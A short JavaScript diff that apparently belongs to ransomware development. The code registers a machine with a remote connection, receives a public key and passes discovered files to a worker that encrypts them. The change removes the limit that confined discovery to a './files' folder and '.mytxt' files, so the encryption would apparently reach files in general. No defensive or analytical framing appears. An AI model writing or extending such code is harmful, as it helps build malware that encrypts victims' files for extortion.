@@ -13,13 +13,7 @@ if (!sysInfo) {
 }
 connection.registerMachine(sysInfo, function({ publicKey }) {
   const cipher = Encrypter(publicKey);
-  discovery(
-    "./files",
-    {
-      extensions: ["mytxt"]
-    },
-    (filename, stats) => {
-      worker(filename, cipher);
-    }
-  );
+  discovery((filename, stats) => {
+    worker(filename, cipher);
+  });
 });
